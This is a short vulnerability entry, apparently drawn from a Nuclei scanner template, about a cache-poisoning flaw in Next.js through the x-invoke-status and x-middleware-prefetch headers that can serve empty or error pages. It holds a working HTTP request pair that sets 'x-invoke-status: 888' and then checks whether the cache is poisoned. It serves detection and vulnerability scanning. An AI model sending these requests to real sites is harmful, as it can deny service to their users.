# Vulnerability: Next.js Cache Poisoning
**Classification:** CVE
**Source:** Nuclei Template (`next-js-cache-poisoning.yaml`)

## Description
Next.js is vulnerable to cache poisoning through the x-middleware-prefetch and x-invoke-status headers. This can result in DoS by serving an empty JSON object or error page instead of the intended content, affecting SSR responses.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /?cb={{rand}} HTTP/1.1
Host: {{Hostname}}
Priority: u=1
x-invoke-status: 888

GET /?cb={{rand}} HTTP/1.1
Host: {{Hostname}}
```

